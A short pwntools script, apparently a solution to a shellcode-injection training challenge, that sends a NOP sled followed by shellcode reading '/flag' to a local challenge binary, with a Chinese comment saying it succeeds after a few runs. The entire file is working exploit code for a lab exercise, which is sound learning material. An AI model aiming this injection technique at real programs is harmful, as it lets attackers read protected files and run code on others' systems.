from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/shellcode-injection-level1.1"
p = process(challenge_path)

assem='.rept 0x900;nop;.endr'+shellcraft.cat("/flag")
assemed=asm(assem)
p.sendafter("Reading 0x1000 bytes from stdin.\n\n",assemed)
result=p.recvall()
print(result)
# python3 /home/hacker/si1.1.py
# 多跑几遍就出结果了